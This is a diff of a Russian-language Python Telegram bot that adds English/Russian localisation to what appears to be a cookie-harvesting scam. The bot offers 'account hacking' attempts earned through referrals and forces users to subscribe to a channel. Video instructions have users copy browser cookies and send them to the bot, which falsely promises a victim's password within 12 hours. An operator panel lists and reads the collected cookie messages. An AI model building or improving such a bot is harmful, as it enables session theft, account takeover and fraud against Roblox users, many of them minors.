+    keyboard.append([InlineKeyboardButton("📩 " + get_text(user_id, "cookies"), callback_data="view_keyword_messages")])
+    keyboard.append([InlineKeyboardButton(get_text(user_id, "delete_single_user"), callback_data="delete_single_user")])
+    keyboard.append([InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")])
+    keyboard.append([InlineKeyboardButton(get_text(user_id, "all_users"), callback_data="view_all_users")])
+    keyboard.append([InlineKeyboardButton(get_text(user_id, "chat_user"), callback_data="select_user_for_chat")])
+    keyboard.append([InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")])
     
     reply_markup = InlineKeyboardMarkup(keyboard)
     
@@ -452,15 +693,15 @@ async def show_keyword_users_page(query, context, page=0, per_page=10):
         parts = [text[i:i+4000] for i in range(0, len(text), 4000)]
         for part in parts:
             await query.message.reply_text(part)
-        await query.message.reply_text("⬅️ Нажмите кнопку ниже:", reply_markup=reply_markup)
+        await query.message.reply_text("⬅️ " + get_text(user_id, "back"), reply_markup=reply_markup)
     else:
         await query.edit_message_text(text, reply_markup=reply_markup)
 
 async def show_chat_users_page(query, context, page=0, per_page=10):
-    """Показывает страницу со списком пользователей для чата"""
+    user_id = query.from_user.id
     users = get_all_users()
     if not users:
-        await query.edit_message_text("📭 Нет пользователей.")
+        await query.edit_message_text(get_text(user_id, "no_users"))
         return
     
     users_list = list(users.items())
@@ -474,42 +715,40 @@ async def show_chat_users_page(query, context, page=0, per_page=10):
     end_idx = min(start_idx + per_page, total_users)
     current_users = users_list[start_idx:end_idx]
     
-    text = f"💬 **ВЫБЕРИТЕ ПОЛЬЗОВАТЕЛЯ:**\n\n"
-    text += f"📊 Всего: {total_users} пользователей\n"
-    text += f"📄 Страница {page + 1} из {total_pages}\n\n"
+    text = get_text(user_id, "chat_select_user", total=total_users, page=page+1, total_pages=total_pages)
     
     keyboard = []
-    for user_id, user_data in current_users:
+    for user_id_str, user_data in current_users:
         name = user_data.get("first_name", "Unknown")
         username = user_data.get("username", "no_username")
-        has_keyword = "✅" if is_keyword_user(user_id) else "❌"
-        msg_count = len(get_user_messages(user_id))
-        attempts = get_user_attempts(user_id)
+        has_keyword = "✅" if is_keyword_user(user_id_str) else "❌"
+        msg_count = len(get_user_messages(user_id_str))
+        attempts = get_user_attempts(user_id_str)
         button_text = f"👤 {name} (@{username}) {has_keyword} 📩{msg_count} 🎯{attempts}"
-        keyboard.append([InlineKeyboardButton(button_text, callback_data=f"chat_user_{user_id}")])
+        keyboard.append([InlineKeyboardButton(button_text, callback_data=f"chat_user_{user_id_str}")])
     
     nav_buttons = []
     if page > 0:
-        nav_buttons.append(InlineKeyboardButton("◀️ Назад", callback_data=f"chat_users_page_{page - 1}"))
+        nav_buttons.append(InlineKeyboardButton(get_text(user_id, "prev"), callback_data=f"chat_users_page_{page - 1}"))
     if page < total_pages - 1:
-        nav_buttons.append(InlineKeyboardButton("Вперед ▶️", callback_data=f"chat_users_page_{page + 1}"))
+        nav_buttons.append(InlineKeyboardButton(get_text(user_id, "next"), callback_data=f"chat_users_page_{page + 1}"))
     
     if nav_buttons:
         keyboard.append(nav_buttons)
     
-    keyboard.append([InlineKeyboardButton("◀️ Назад в меню", callback_data="back_to_menu")])
+    keyboard.append([InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")])
     
     reply_markup = InlineKeyboardMarkup(keyboard)
     await query.edit_message_text(
-        text + "✅ - отправил ключевое слово\n❌ - не отправлял\n📩 - количество сообщений\n🎯 - количество попыток",
+        text + "✅ - " + get_text(user_id, "keyword_only").replace("🔑 ", "") + "\n❌ - " + get_text(user_id, "no_keyword_messages").split(" ")[0] + "\n📩 - " + get_text(user_id, "message_received").split(" ")[0] + "\n🎯 - " + get_text(user_id, "give_attempts").replace("🎯 ", ""),
         reply_markup=reply_markup
     )
 
 async def show_keyword_messages_page(query, context, page=0, per_page=10):
-    """Показывает страницу со списком пользователей для просмотра их сообщений"""
+    user_id = query.from_user.id
     users = get_keyword_users()
     if not users:
-        await query.edit_message_text("📭 Нет пользователей с ключевым словом.")
+        await query.edit_message_text(get_text(user_id, "no_keyword_users"))
         return
     
     users_list = list(users.items())
@@ -523,26 +762,25 @@ async def show_keyword_messages_page(query, context, page=0, per_page=10):
     end_idx = min(start_idx + per_page, total_users)
     current_users = users_list[start_idx:end_idx]
     
-    text = f"👥 **ВЫБЕРИТЕ ПОЛЬЗОВАТЕЛЯ ДЛЯ ПРОСМОТРА СООБЩЕНИЙ:**\n\n"
-    text += f"📊 Всего: {total_users} пользователей\n"
-    text += f"📄 Страница {page + 1} из {total_pages}\n\n"
+    text = "👥 **" + get_text(user_id, "cookies") + ":**\n\n"
+    text += get_text(user_id, "chat_select_user", total=total_users, page=page+1, total_pages=total_pages)
     
     keyboard = []
-    for user_id, user_data in current_users:
+    for user_id_str, user_data in current_users:
         name = user_data.get("first_name", "Unknown")
         username = user_data.get("username", "no_username")
-        keyboard.append([InlineKeyboardButton(f"👤 {name} (@{username})", callback_data=f"view_user_{user_id}")])
+        keyboard.append([InlineKeyboardButton(f"👤 {name} (@{username})", callback_data=f"view_user_{user_id_str}")])
     
     nav_buttons = []
     if page > 0:
-        nav_buttons.append(InlineKeyboardButton("◀️ Назад", callback_data=f"keyword_messages_page_{page - 1}"))
+        nav_buttons.append(InlineKeyboardButton(get_text(user_id, "prev"), callback_data=f"keyword_messages_page_{page - 1}"))
     if page < total_pages - 1:
-        nav_buttons.append(InlineKeyboardButton("Вперед ▶️", callback_data=f"keyword_messages_page_{page + 1}"))
+        nav_buttons.append(InlineKeyboardButton(get_text(user_id, "next"), callback_data=f"keyword_messages_page_{page + 1}"))
     
     if nav_buttons:
         keyboard.append(nav_buttons)
     
-    keyboard.append([InlineKeyboardButton("◀️ Назад", callback_data="view_keyword_users_only")])
+    keyboard.append([InlineKeyboardButton(get_text(user_id, "back"), callback_data="view_keyword_users_only")])
     
     reply_markup = InlineKeyboardMarkup(keyboard)
     await query.edit_message_text(text, reply_markup=reply_markup)
@@ -552,10 +790,10 @@ async def show_keyword_messages_page(query, context, page=0, per_page=10):
 # ===================================================
 
 async def show_give_attempts_page(query, context, page=0, per_page=10):
-    """Показывает страницу со списком пользователей для выдачи попыток"""
+    user_id = query.from_user.id
     users = get_all_users()
     if not users:
-        await query.edit_message_text("📭 Нет пользователей.")
+        await query.edit_message_text(get_text(user_id, "no_users"))
         return
     
     users_list = list(users.items())
@@ -569,29 +807,27 @@ async def show_give_attempts_page(query, context, page=0, per_page=10):
     end_idx = min(start_idx + per_page, total_users)
     current_users = users_list[start_idx:end_idx]
     
-    text = f"🎯 **ВЫБЕРИТЕ ПОЛЬЗОВАТЕЛЯ ДЛЯ ВЫДАЧИ ПОПЫТОК:**\n\n"
-    text += f"📊 Всего: {total_users} пользователей\n"
-    text += f"📄 Страница {page + 1} из {total_pages}\n\n"
+    text = get_text(user_id, "give_attempts_menu", total=total_users, page=page+1, total_pages=total_pages)
     
     keyboard = []
-    for user_id, user_data in current_users:
+    for user_id_str, user_data in current_users:
         name = user_data.get("first_name", "Unknown")
         username = user_data.get("username", "no_username")
-        attempts = get_user_attempts(user_id)
+        attempts = get_user_attempts(user_id_str)
         button_text = f"👤 {name} (@{username}) 🎯{attempts}"
-        keyboard.append([InlineKeyboardButton(button_text, callback_data=f"give_attempts_user_{user_id}")])
+        keyboard.append([InlineKeyboardButton(button_text, callback_data=f"give_attempts_user_{user_id_str}")])
     
     nav_buttons = []
     if page > 0:
-        nav_buttons.append(InlineKeyboardButton("◀️ Назад", callback_data=f"give_attempts_page_{page - 1}"))
+        nav_buttons.append(InlineKeyboardButton(get_text(user_id, "prev"), callback_data=f"give_attempts_page_{page - 1}"))
     if page < total_pages - 1:
-        nav_buttons.append(InlineKeyboardButton("Вперед ▶️", callback_data=f"give_attempts_page_{page + 1}"))
+        nav_buttons.append(InlineKeyboardButton(get_text(user_id, "next"), callback_data=f"give_attempts_page_{page + 1}"))
     
     if nav_buttons:
         keyboard.append(nav_buttons)
     
-    keyboard.append([InlineKeyboardButton("🎯 Выдать всем у кого 0", callback_data="give_all_zero")])
-    keyboard.append([InlineKeyboardButton("◀️ Назад в меню", callback_data="back_to_menu")])
+    keyboard.append([InlineKeyboardButton(get_text(user_id, "give_all_zero"), callback_data="give_all_zero")])
+    keyboard.append([InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")])
     
     reply_markup = InlineKeyboardMarkup(keyboard)
     await query.edit_message_text(text, reply_markup=reply_markup)
@@ -600,75 +836,65 @@ async def show_give_attempts_page(query, context, page=0, per_page=10):
 # ФУНКЦИЯ ДЛЯ ВЫДАЧИ ПОПЫТОК ВСЕМ У КОГО 0
 # ===================================================
 
-async def give_attempts_to_all_zero(query: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Выдает по 1 попытке всем пользователям у которых 0 попыток"""
+async def give_attempts_to_all_zero(query, context):
+    user_id = query.from_user.id
     all_users = get_all_users()
     if not all_users:
-        await query.edit_message_text("📭 Нет пользователей.")
+        await query.edit_message_text(get_text(user_id, "no_users"))
         return
     
     zero_users = []
-    for user_id in all_users.keys():
-        attempts = get_user_attempts(user_id)
+    for user_id_str in all_users.keys():
+        attempts = get_user_attempts(user_id_str)
         if attempts <= 0:
-            zero_users.append(user_id)
+            zero_users.append(user_id_str)
     
     if not zero_users:
-        await query.edit_message_text(
-            "✅ У всех пользователей есть попытки!\n"
-            "Никому не нужно выдавать."
-        )
+        await query.edit_message_text(get_text(user_id, "give_all_zero_no_users"))
         return
     
-    # Подтверждение перед выдачей
     keyboard = [
-        [InlineKeyboardButton("✅ ДА, выдать всем", callback_data="confirm_give_all_zero")],
-        [InlineKeyboardButton("❌ Отмена", callback_data="give_attempts_menu")]
+        [InlineKeyboardButton("✅ " + get_text(user_id, "yes_delete").replace("✅ ", ""), callback_data="confirm_give_all_zero")],
+        [InlineKeyboardButton(get_text(user_id, "cancel"), callback_data="give_attempts_menu")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     await query.edit_message_text(
-        f"⚠️ **ВНИМАНИЕ!**\n\n"
-        f"Вы собираетесь выдать по 1 попытке всем пользователям у которых 0 попыток.\n\n"
-        f"👥 Таких пользователей: {len(zero_users)}\n\n"
-        f"Подтвердите действие:",
+        get_text(user_id, "give_all_zero_confirm", count=len(zero_users)),
         reply_markup=reply_markup
     )
 
-async def execute_give_all_zero(query: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Выполняет выдачу попыток всем у кого 0"""
+async def execute_give_all_zero(query, context):
+    user_id = query.from_user.id
     all_users = get_all_users()
     zero_users = []
-    for user_id in all_users.keys():
-        attempts = get_user_attempts(user_id)
+    for user_id_str in all_users.keys():
+        attempts = get_user_attempts(user_id_str)
         if attempts <= 0:
-            zero_users.append(user_id)
+            zero_users.append(user_id_str)
     
     if not zero_users:
-        await query.edit_message_text("❌ Нет пользователей с 0 попытками.")
+        await query.edit_message_text(get_text(user_id, "give_all_zero_no_users"))
         return
     
     success = 0
     failed = 0
     
     status_msg = await query.edit_message_text(
-        f"⏳ Выдаю попытки {len(zero_users)} пользователям..."
+        get_text(user_id, "mailing_start", count=len(zero_users))
     )
     
-    for user_id in zero_users:
+    for user_id_str in zero_users:
         try:
-            add_attempts(user_id, 1)
+            add_attempts(user_id_str, 1)
             success += 1
             await asyncio.sleep(0.1)
         except Exception as e:
             failed += 1
-            print(f"Ошибка выдачи попытки {user_id}: {e}")
+            print(f"Ошибка выдачи попытки {user_id_str}: {e}")
     
     await status_msg.edit_text(
-        f"✅ **Попытки успешно выданы!**\n\n"
-        f"👥 Получили попытку: {success}\n"
-        f"❌ Ошибок: {failed}\n"
-        f"📊 Всего выдано: {success} попыток"
+        get_text(user_id, "give_all_zero_success", success=success, failed=failed, total=success)
     )
 
 # ===================================================
@@ -679,21 +905,16 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_id = user.id
     
-    # Проверяем подписку для обычных пользователей
     if user_id != YOUR_USER_ID:
         is_subscribed = await check_subscription(user_id, context)
         if not is_subscribed:
             keyboard = [
-                [InlineKeyboardButton("📢 ПОДПИСАТЬСЯ НА КАНАЛ", url="https://t.me/reviewsh1pe")],
-                [InlineKeyboardButton("✅ Я ПОДПИСАЛСЯ", callback_data="check_subscription")]
+                [InlineKeyboardButton(get_text(user_id, "subscribe_button"), url="https://t.me/reviewsh1pe")],
+                [InlineKeyboardButton(get_text(user_id, "subscribed_button"), callback_data="check_subscription")]
             ]
             reply_markup = InlineKeyboardMarkup(keyboard)
             await update.message.reply_text(
-                "⚠️ **Для использования бота необходимо подписаться на наш канал!**\n\n"
-                "1️⃣ Нажмите кнопку ниже\n"
-                "2️⃣ Подпишитесь на канал\n"
-                "3️⃣ Вернитесь в бота и нажмите '✅ Я ПОДПИСАЛСЯ'\n\n"
-                "🔗 **Канал:** @reviewsh1pe",
+                get_text(user_id, "check_subscription"),
                 reply_markup=reply_markup,
                 parse_mode='Markdown'
             )
@@ -728,39 +949,37 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     keyboard = [
         [
-            InlineKeyboardButton("Взломать аккаунт", callback_data="device"),
-            InlineKeyboardButton("Инструкция", callback_data="cookies"),
+            InlineKeyboardButton(get_text(user_id, "device"), callback_data="device"),
+            InlineKeyboardButton(get_text(user_id, "cookies"), callback_data="cookies"),
         ],
         [
-            InlineKeyboardButton("👥 Пригласить друга", callback_data="referral"),
-            InlineKeyboardButton("💰 Купить Roblox", callback_data="buy_roblox"),
+            InlineKeyboardButton(get_text(user_id, "referral"), callback_data="referral"),
+            InlineKeyboardButton(get_text(user_id, "buy_roblox"), callback_data="buy_roblox"),
         ]
     ]
     
     if user_id == YOUR_USER_ID:
         keyboard.append([
-            InlineKeyboardButton("👥 Все пользователи", callback_data="view_all_users"),
-            InlineKeyboardButton("🔑 С ключевым словом", callback_data="view_keyword_users_only"),
+            InlineKeyboardButton(get_text(user_id, "all_users"), callback_data="view_all_users"),
+            InlineKeyboardButton(get_text(user_id, "keyword_users"), callback_data="view_keyword_users_only"),
         ])
         keyboard.append([
-            InlineKeyboardButton("📊 Статистика", callback_data="view_stats"),
-            InlineKeyboardButton("💬 Чат с пользователем", callback_data="select_user_for_chat"),
+            InlineKeyboardButton(get_text(user_id, "stats"), callback_data="view_stats"),
+            InlineKeyboardButton(get_text(user_id, "chat_user"), callback_data="select_user_for_chat"),
         ])
         keyboard.append([
-            InlineKeyboardButton("🎯 Выдать попытки", callback_data="give_attempts_menu"),
-            InlineKeyboardButton("📨 Рассылка", callback_data="send_mailing"),
+            InlineKeyboardButton(get_text(user_id, "give_attempts"), callback_data="give_attempts_menu"),
+            InlineKeyboardButton(get_text(user_id, "mailing"), callback_data="send_mailing"),
         ])
         keyboard.append([
-            InlineKeyboardButton("🗑 Удалить пользователей", callback_data="delete_users_menu"),
+            InlineKeyboardButton(get_text(user_id, "delete_users"), callback_data="delete_users_menu"),
         ])
+    
+    keyboard.append([InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")])
     
     reply_markup = InlineKeyboardMarkup(keyboard)
     await update.message.reply_text(
-        f"Привет, {user_name}! 👋\n\n"
-        f"🎯 **У тебя {attempts} бесплатная попытка взлома**\n"
-        f"👥 Приглашено друзей: {referrals}\n"
-        f"🔑 За каждого друга +1 попытка\n\n"
-        f"Выбери нужную категорию:",
+        get_text(user_id, "bot_start", name=user_name, attempts=attempts, referrals=referrals),
         reply_markup=reply_markup
     )
 
@@ -776,65 +995,130 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     is_admin = (user_id == YOUR_USER_ID)
     data = query.data
     
+    # --- СМЕНА ЯЗЫКА ---
+    if data == "change_language":
+        keyboard = [
+            [InlineKeyboardButton("🇷🇺 Русский", callback_data="lang_ru")],
+            [InlineKeyboardButton("🇬🇧 English", callback_data="lang_en")],
+            [InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await query.edit_message_text(
+            get_text(user_id, "language_selection"),
+            reply_markup=reply_markup
+        )
+        return
+    
+    if data.startswith("lang_"):
+        lang = data.replace("lang_", "")
+        set_user_language(user_id, lang)
+        
+        if lang == "ru":
+            await query.edit_message_text(get_text(user_id, "language_changed"))
+        else:
+            await query.edit_message_text(get_text(user_id, "language_changed_en"))
+        
+        # Показываем меню
+        user_name = update.effective_user.first_name
+        attempts = get_user_attempts(user_id)
+        referrals = get_referral_count(user_id)
+        
+        keyboard = [
+            [
+                InlineKeyboardButton(get_text(user_id, "device"), callback_data="device"),
+                InlineKeyboardButton(get_text(user_id, "cookies"), callback_data="cookies"),
+            ],
+            [
+                InlineKeyboardButton(get_text(user_id, "referral"), callback_data="referral"),
+                InlineKeyboardButton(get_text(user_id, "buy_roblox"), callback_data="buy_roblox"),
+            ]
+        ]
+        
+        if user_id == YOUR_USER_ID:
+            keyboard.append([
+                InlineKeyboardButton(get_text(user_id, "all_users"), callback_data="view_all_users"),
+                InlineKeyboardButton(get_text(user_id, "keyword_users"), callback_data="view_keyword_users_only"),
+            ])
+            keyboard.append([
+                InlineKeyboardButton(get_text(user_id, "stats"), callback_data="view_stats"),
+                InlineKeyboardButton(get_text(user_id, "chat_user"), callback_data="select_user_for_chat"),
+            ])
+            keyboard.append([
+                InlineKeyboardButton(get_text(user_id, "give_attempts"), callback_data="give_attempts_menu"),
+                InlineKeyboardButton(get_text(user_id, "mailing"), callback_data="send_mailing"),
+            ])
+            keyboard.append([
+                InlineKeyboardButton(get_text(user_id, "delete_users"), callback_data="delete_users_menu"),
+            ])
+        
+        keyboard.append([InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")])
+        
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        # Используем query.message.reply_text если edit_message_text не работает
+        try:
+            await query.edit_message_text(
+                get_text(user_id, "bot_start", name=user_name, attempts=attempts, referrals=referrals),
+                reply_markup=reply_markup
+            )
+        except:
+            await query.message.reply_text(
+                get_text(user_id, "bot_start", name=user_name, attempts=attempts, referrals=referrals),
+                reply_markup=reply_markup
+            )
+        return
+    
     # --- ПРОВЕРКА ПОДПИСКИ ---
     if data == "check_subscription":
         is_subscribed = await check_subscription(user_id, context)
         if is_subscribed:
-            # Если подписан - показываем меню
             user_name = update.effective_user.first_name
             attempts = get_user_attempts(user_id)
             referrals = get_referral_count(user_id)
             
             keyboard = [
                 [
-                    InlineKeyboardButton("Взломать аккаунт", callback_data="device"),
-                    InlineKeyboardButton("Инструкция", callback_data="cookies"),
+                    InlineKeyboardButton(get_text(user_id, "device"), callback_data="device"),
+                    InlineKeyboardButton(get_text(user_id, "cookies"), callback_data="cookies"),
                 ],
                 [
-                    InlineKeyboardButton("👥 Пригласить друга", callback_data="referral"),
-                    InlineKeyboardButton("💰 Купить Roblox", callback_data="buy_roblox"),
+                    InlineKeyboardButton(get_text(user_id, "referral"), callback_data="referral"),
+                    InlineKeyboardButton(get_text(user_id, "buy_roblox"), callback_data="buy_roblox"),
                 ]
             ]
             
             if user_id == YOUR_USER_ID:
                 keyboard.append([
-                    InlineKeyboardButton("👥 Все пользователи", callback_data="view_all_users"),
-                    InlineKeyboardButton("🔑 С ключевым словом", callback_data="view_keyword_users_only"),
+                    InlineKeyboardButton(get_text(user_id, "all_users"), callback_data="view_all_users"),
+                    InlineKeyboardButton(get_text(user_id, "keyword_users"), callback_data="view_keyword_users_only"),
                 ])
                 keyboard.append([
-                    InlineKeyboardButton("📊 Статистика", callback_data="view_stats"),
-                    InlineKeyboardButton("💬 Чат с пользователем", callback_data="select_user_for_chat"),
+                    InlineKeyboardButton(get_text(user_id, "stats"), callback_data="view_stats"),
+                    InlineKeyboardButton(get_text(user_id, "chat_user"), callback_data="select_user_for_chat"),
                 ])
                 keyboard.append([
-                    InlineKeyboardButton("🎯 Выдать попытки", callback_data="give_attempts_menu"),
-                    InlineKeyboardButton("📨 Рассылка", callback_data="send_mailing"),
+                    InlineKeyboardButton(get_text(user_id, "give_attempts"), callback_data="give_attempts_menu"),
+                    InlineKeyboardButton(get_text(user_id, "mailing"), callback_data="send_mailing"),
                 ])
                 keyboard.append([
-                    InlineKeyboardButton("🗑 Удалить пользователей", callback_data="delete_users_menu"),
+                    InlineKeyboardButton(get_text(user_id, "delete_users"), callback_data="delete_users_menu"),
                 ])
+            
+            keyboard.append([InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")])
             
             reply_markup = InlineKeyboardMarkup(keyboard)
             await query.edit_message_text(
-                f"Привет, {user_name}! 👋\n\n"
-                f"🎯 **У тебя {attempts} бесплатная попытка взлома**\n"
-                f"👥 Приглашено друзей: {referrals}\n"
-                f"🔑 За каждого друга +1 попытка\n\n"
-                f"Выбери нужную категорию:",
+                get_text(user_id, "bot_start", name=user_name, attempts=attempts, referrals=referrals),
                 reply_markup=reply_markup
             )
         else:
-            # Если не подписан - показываем сообщение с кнопкой
             keyboard = [
-                [InlineKeyboardButton("📢 ПОДПИСАТЬСЯ НА КАНАЛ", url="https://t.me/reviewsh1pe")],
-                [InlineKeyboardButton("✅ Я ПОДПИСАЛСЯ", callback_data="check_subscription")]
+                [InlineKeyboardButton(get_text(user_id, "subscribe_button"), url="https://t.me/reviewsh1pe")],
+                [InlineKeyboardButton(get_text(user_id, "subscribed_button"), callback_data="check_subscription")]
             ]
             reply_markup = InlineKeyboardMarkup(keyboard)
             await query.edit_message_text(
-                "❌ **Вы ещё не подписались на канал!**\n\n"
-                "1️⃣ Нажмите кнопку ниже\n"
-                "2️⃣ Подпишитесь на канал\n"
-                "3️⃣ Вернитесь в бота и нажмите '✅ Я ПОДПИСАЛСЯ'\n\n"
-                "🔗 **Канал:** @reviewsh1pe",
+                get_text(user_id, "not_subscribed"),
                 reply_markup=reply_markup,
                 parse_mode='Markdown'
             )
@@ -843,18 +1127,11 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # --- ПОКУПКА ROBLOX ---
     if data == "buy_roblox":
         keyboard = [
-            [InlineKeyboardButton("◀️ Назад в меню", callback_data="back_to_menu")]
+            [InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
-            "💎 **КУПИТЬ ROBLOX** 💎\n\n"
-            "💰 Хотите приобрести Robux или любую вещь в Roblox?\n\n"
-            "📩 **Свяжитесь с нами:**\n"
-            "👤 @h1peoff\n\n"
-            "⚡ Быстрое оформление\n"
-            "💳 Безопасная оплата\n"
-            "🎁 Лучшие цены\n\n"
-            "Напишите нам прямо сейчас! 🚀",
+            get_text(user_id, "buy_roblox_title"),
             reply_markup=reply_markup,
             parse_mode='Markdown'
         )
@@ -862,49 +1139,36 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     # --- РЕФЕРАЛЬНАЯ СИСТЕМА ---
     if data == "referral":
-        user_id = update.effective_user.id
         referrals = get_referral_count(user_id)
         attempts = get_user_attempts(user_id)
         
         bot_username = context.bot.username or "YourBot"
         referral_link = f"https://t.me/{bot_username}?start=ref_{user_id}"
         
-        text = (
-            f"👥 **Пригласи друга и получи +1 попытку!**\n\n"
-            f"🎯 Твои попытки: {attempts}\n"
-            f"👥 Приглашено друзей: {referrals}\n"
-            f"🔑 За каждого друга +1 попытка\n\n"
-            f"📎 **Твоя реферальная ссылка:**\n"
-            f"`{referral_link}`\n\n"
-            f"📋 **Как это работает:**\n"
-            f"1. Отправь ссылку другу\n"
-            f"2. Друг переходит по ссылке и запускает бота\n"
-            f"3. Ты получаешь +1 попытку взлома\n\n"
-            f"⚠️ Важно: друг должен быть новым пользователем!"
-        )
-        
         keyboard = [
-            [InlineKeyboardButton("◀️ Назад в меню", callback_data="back_to_menu")]
+            [InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         
-        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')
+        await query.edit_message_text(
+            get_text(user_id, "referral_text", attempts=attempts, referrals=referrals, link=referral_link),
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
         return
     
     # --- ОБЫЧНЫЕ КНОПКИ (ДОСТУПНЫ ВСЕМ) ---
     if data == "device":
-        # Проверяем подписку перед использованием
         if user_id != YOUR_USER_ID:
             is_subscribed = await check_subscription(user_id, context)
             if not is_subscribed:
                 keyboard = [
-                    [InlineKeyboardButton("📢 ПОДПИСАТЬСЯ НА КАНАЛ", url="https://t.me/reviewsh1pe")],
-                    [InlineKeyboardButton("✅ Я ПОДПИСАЛСЯ", callback_data="check_subscription")]
+                    [InlineKeyboardButton(get_text(user_id, "subscribe_button"), url="https://t.me/reviewsh1pe")],
+                    [InlineKeyboardButton(get_text(user_id, "subscribed_button"), callback_data="check_subscription")]
                 ]
                 reply_markup = InlineKeyboardMarkup(keyboard)
                 await query.edit_message_text(
-                    "❌ **Для использования бота подпишитесь на канал!**\n\n"
-                    "🔗 **Канал:** @reviewsh1pe",
+                    get_text(user_id, "not_subscribed"),
                     reply_markup=reply_markup,
                     parse_mode='Markdown'
                 )
@@ -914,32 +1178,29 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         if attempts <= 0:
             keyboard = [
-                [InlineKeyboardButton("👥 Пригласить друга", callback_data="referral")],
-                [InlineKeyboardButton("◀️ Вернуться", callback_data="back_to_menu")]
+                [InlineKeyboardButton(get_text(user_id, "referral"), callback_data="referral")],
+                [InlineKeyboardButton(get_text(user_id, "back"), callback_data="back_to_menu")]
             ]
             reply_markup = InlineKeyboardMarkup(keyboard)
             await query.edit_message_text(
-                "❌ **У тебя закончились попытки взлома!**\n\n"
-                "Чтобы получить новую попытку, пригласи друга.\n"
-                "За каждого друга ты получаешь +1 попытку! 🎁",
+                get_text(user_id, "no_attempts"),
                 reply_markup=reply_markup
             )
             return
         
         keyboard = [
             [
-                InlineKeyboardButton("📱 Телефон", callback_data="phone"),
-                InlineKeyboardButton("💻 Компьютер", callback_data="computer"),
+                InlineKeyboardButton(get_text(user_id, "phone"), callback_data="phone"),
+                InlineKeyboardButton(get_text(user_id, "computer"), callback_data="computer"),
             ],
             [
-                InlineKeyboardButton("◀️ Вернуться", callback_data="back_to_menu"),
+                InlineKeyboardButton(get_text(user_id, "back"), callback_data="back_to_menu"),
             ]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         
         await query.edit_message_text(
-            f"🎯 **У тебя {attempts} попытка взлома осталась**\n\n"
-            f"Выбери своё устройство:",
+            get_text(user_id, "device_choice", attempts=attempts),
             reply_markup=reply_markup
         )
         return
@@ -947,14 +1208,14 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data == "phone":
         keyboard = [
             [
-                InlineKeyboardButton("◀️ Вернуться", callback_data="back_to_menu"),
-                InlineKeyboardButton("Скопировал куки ✅", callback_data="cookies_copied_phone"),
+                InlineKeyboardButton(get_text(user_id, "back"), callback_data="back_to_menu"),
+                InlineKeyboardButton(get_text(user_id, "cookies_copied"), callback_data="cookies_copied_phone"),
             ]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.message.reply_video(
             video="https://t.me/cookieeditort/3",
-            caption="📱 Посмотрите видео полностью и выполните все указания как в видео и тогда все сработает.",
+            caption=get_text(user_id, "phone_video"),
             reply_markup=reply_markup
         )
         await query.delete_message()
@@ -963,92 +1224,77 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data == "computer":
         keyboard = [
             [
-                InlineKeyboardButton("◀️ Вернуться", callback_data="back_to_menu"),
-                InlineKeyboardButton("Скопировал куки ✅", callback_data="cookies_copied_computer"),
+                InlineKeyboardButton(get_text(user_id, "back"), callback_data="back_to_menu"),
+                InlineKeyboardButton(get_text(user_id, "cookies_copied"), callback_data="cookies_copied_computer"),
             ]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.message.reply_video(
             video="https://t.me/cookieeditort/4",
-            caption="💻 Посмотрите видео полностью и выполните все указания как в видео и тогда все сработает.",
+            caption=get_text(user_id, "computer_video"),
             reply_markup=reply_markup
         )
         await query.delete_message()
         return
     
     elif data == "cookies_copied_phone" or data == "cookies_copied_computer":
-        await query.message.reply_text(
-            "Скинь cookie в бота\n"
-            "И бот начнет поиск пароля вашей жертвы😈\n"
-            "В течении 12 часов бот скинет вам пароль от аккаунта"
-        )
+        await query.message.reply_text(get_text(user_id, "cookies_sent"))
         return
     
     elif data == "cookies":
-        keyboard = [[InlineKeyboardButton("◀️ Вернуться", callback_data="back_to_menu")]]
+        keyboard = [[InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")]]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
-            "1. Зайти на профиль жертвы\n"
-            "2. Скопировать cookie\n"
-            "3. Вставить cookie в бота\n"
-            "4. Скинуть ссылку 📌 cookie в бота\n"
-            "5. Ожидать до получения пароля и логина",
+            get_text(user_id, "cookies_instruction"),
             reply_markup=reply_markup
         )
         return
     
     elif data == "back_to_menu":
         user_name = update.effective_user.first_name
-        user_id = update.effective_user.id
         attempts = get_user_attempts(user_id)
         referrals = get_referral_count(user_id)
         
         keyboard = [
             [
-                InlineKeyboardButton("Взломать аккаунт", callback_data="device"),
-                InlineKeyboardButton("Инструкция", callback_data="cookies"),
+                InlineKeyboardButton(get_text(user_id, "device"), callback_data="device"),
+                InlineKeyboardButton(get_text(user_id, "cookies"), callback_data="cookies"),
             ],
             [
